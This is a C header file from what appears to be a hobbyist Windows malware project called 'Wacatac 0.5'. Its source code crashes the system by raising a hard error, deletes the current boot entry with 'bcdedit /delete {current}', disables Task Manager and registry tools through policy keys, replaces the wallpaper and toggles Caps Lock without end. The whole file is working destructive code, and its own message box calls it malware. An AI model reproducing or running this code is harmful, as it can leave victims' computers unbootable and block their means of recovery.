typedef struct IUnknown IUnknown;
#pragma once

#include "Wacatac.h"
#include "BackgroundHex.h"

EXTERN_C NTSTATUS WINAPI RtlAdjustPrivilege(DWORD, BYTE, BYTE, PBYTE);
EXTERN_C NTSTATUS WINAPI NtRaiseHardError(NTSTATUS, DWORD, DWORD, PDWORD_PTR, DWORD, PDWORD);

WINBOOL CheckForWindowsXP() {
	OSVERSIONINFOA osvi;
	ZeroMemory(&osvi, sizeof(OSVERSIONINFOA));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
	GetVersionExA(&osvi);
	if (osvi.dwMajorVersion == 5) 
	{
		return true;
	}
	return false;
}

void SystemCrasher(NTSTATUS ntStatus, DWORD dwResponse) {
	BYTE ntBool;
	RtlAdjustPrivilege(19, true, false, &ntBool);
	NtRaiseHardError(ntStatus, 0, 0, 0, 6, &dwResponse);
}

void Wallpaper(void) 
{
  DWORD dwWriteBytes;
  CreateDirectoryW(L"C:\\WINDOWS", NULL);
  HANDLE hFile = CreateFileW(L"C:\\WINDOWS\\BLACKSCREEN.jpg", GENERIC_ALL, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  WriteFile(hFile, img, _countof(img), &dwWriteBytes, NULL);
  SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (LPVOID)"C:/WINDOWS/BLACKSCREEN.jpg", SPIF_SENDWININICHANGE|SPIF_UPDATEINIFILE);
  CloseHandle(hFile);
}

void NotWindowsXP() {
	MessageBoxW(NULL, L"This malware will not run correctly and may crash, Do you understand?", NULL, MB_ICONQUESTION);
}

void NotWindowsXP2() 
{
	MessageBoxW(NULL, L"error: could not find the OS windows xp. sussy baka", L"Wacatac 0.5.exe", MB_ICONERROR);
	Wallpaper();
}

DWORD WINAPI DestroyMBR(LPVOID lpvd) // Ik this isnt a MBR overwriter but it still can harm Windows
{
    system("bcdedit /delete {current}");
    return 1;
}

void RegistryKeyMaker(HKEY HKey, LPCWSTR Subkey, LPCWSTR ValueName, unsigned long Type, unsigned int Value)
{
	HKEY hKey;
	DWORD dwDisposition;
	LONG result;

	result = RegCreateKeyExW(
		HKey, 
		Subkey,
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		NULL,
		&hKey,
		&dwDisposition);

	result = RegSetValueExW(
		hKey,	
		ValueName,	
		0,	
		Type,	
		(const unsigned char*)&Value,
		(int)sizeof(Value)	
	);

	RegCloseKey(hKey);
	return;
}

void DisableTools(void)
{
   RegistryKeyMaker(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
   RegistryKeyMaker(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
 //RegistryKeyMaker(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 2);
}

void SendKeyboardInput(INPUT inputs, WORD wKey, int Milliseconds) {
	inputs.type = INPUT_KEYBOARD;
	inputs.ki.wVk = wKey;
	SendInput(1, &inputs, sizeof(INPUT));
	ZeroMemory(&inputs, sizeof(INPUT));
	Sleep(Milliseconds);
	inputs.ki.dwFlags = KEYEVENTF_KEYUP;
	SendInput(1, &inputs, sizeof(INPUT));
	ZeroMemory(&inputs, sizeof(INPUT));
	Sleep(Milliseconds);
}

DWORD CALLBACK KeyboardInputs(LPVOID lpvd) {
		INPUT ipt;
		while (true)
		{
			SendKeyboardInput(ipt, VK_CAPITAL, 500);
		}
		return 0;
}

VOID EndPayload(HANDLE hPayload, HANDLE hPML)
{
	TerminateThread(hPayload, NULL);
	CloseHandle(hPayload);
	HeapDestroy(hPML);
}
